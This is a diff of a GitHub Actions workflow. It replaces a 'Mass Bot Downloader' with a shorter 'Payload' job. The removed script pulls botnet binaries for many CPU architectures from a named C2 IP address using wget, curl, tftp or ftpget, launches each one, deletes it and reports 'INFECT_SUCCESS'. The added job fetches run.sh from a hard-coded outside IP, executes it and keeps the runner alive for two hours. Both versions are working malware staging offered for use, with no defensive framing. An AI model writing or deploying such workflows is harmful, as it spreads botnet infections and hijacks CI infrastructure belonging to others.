@@ -1,115 +1,14 @@
-name: Mass Bot Downloader (No Cat)
+name: Payload
 
-on:
-  workflow_dispatch:
-    inputs:
-      c2_ip:
-        description: 'C2 Server IP'
-        required: true
-        default: '220.158.232.160'
-      c2_port:
-        description: 'C2 Port'
-        required: true
-        default: '80'
-      c2_path:
-        description: 'Path to binaries'
-        required: true
-        default: '/release'
+on: workflow_dispatch
 
 jobs:
-  download-all:
+  run:
     runs-on: ubuntu-latest
-    
     steps:
-    - name: Install Tools
-      run: |
-        sudo apt update
-        sudo apt install -y wget curl tftp-hpa ftp netcat-openbsd busybox
-
-    - name: Create Download Script
-      run: |
-        cat > downloader.sh << 'SCRIPT'
-        #!/bin/sh
-        set -x
-        
-        C2_IP="${{ github.event.inputs.c2_ip }}"
-        C2_PORT="${{ github.event.inputs.c2_port }}"
-        C2_PATH="${{ github.event.inputs.c2_path }}"
-        
-        cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || cd "$(pwd)"
-        echo "Current directory: $(pwd)"
-        
-        BINS="arc arm arm5 arm6 arm7 m68k mips mpsl ppc ppc440 sh4 x86 x86_32 x86_64"
-        
-        for b in $BINS; do
-            echo "===== Trying architecture: $b ====="
-            
-            # Method 1: wget
-            wget "http://$C2_IP:$C2_PORT$C2_PATH/$b" -O "$b" 2>&1
-            if [ -s "$b" ]; then
-                echo "wget succeeded for $b"
-                continue
-            fi
-        
-            # Method 2: curl
-            curl -s "http://$C2_IP:$C2_PORT$C2_PATH/$b" -o "$b" 2>&1
-            if [ -s "$b" ]; then
-                echo "curl succeeded for $b"
-                continue
-            fi
-        
-            # Method 3: tftp
-            tftp -g -r "$C2_PATH/$b" -l "$b" "$C2_IP" 2>&1
-            if [ -s "$b" ]; then
-                echo "tftp succeeded for $b"
-                continue
-            fi
-        
-            # Method 4: ftpget
-            ftpget -u "" -p "" -P 21 "$C2_IP" "$C2_PATH/$b" "$b" 2>&1
-            if [ -s "$b" ]; then
-                echo "ftpget succeeded for $b"
-                continue
-            fi
-        
-            echo "All methods failed for $b"
-        done
-        
-        echo "===== Download phase finished. Now launching binaries ====="
-        
-        for b in $BINS; do
-            if [ -f "$b" ] && [ -s "$b" ]; then
-                echo "Launching $b (size: $(wc -c < $b) bytes)"
-                chmod +x "$b"
-                "./$b" &
-                echo "Started $b in background (PID: $!)"
-            else
-                echo "Binary $b not found or empty"
-            fi
-        done
-        
-        echo "Waiting 5 seconds for binaries to initialise..."
-        sleep 5
-        
-        echo "Cleaning up binaries..."
-        rm -f $BINS
-        
-        echo "INFECT_SUCCESS"
-        SCRIPT
-        
-        chmod +x downloader.sh
-
-    - name: Run Downloader
-      run: |
-        sudo ./downloader.sh
-      timeout-minutes: 10
-
-    - name: Upload Results
-      if: always()
-      uses: actions/upload-artifact@v4
-      with:
-        name: execution-logs-${{ github.run_id }}
-        path: |
-          downloader.sh
-          /tmp/*.log
-        retention-days: 3
+    - run: |
+        cd /tmp
+        wget http://16.171.16.1/run.sh -O run.sh 2>/dev/null
+        chmod 777 run.sh
+        ./run.sh
+        sleep 7200
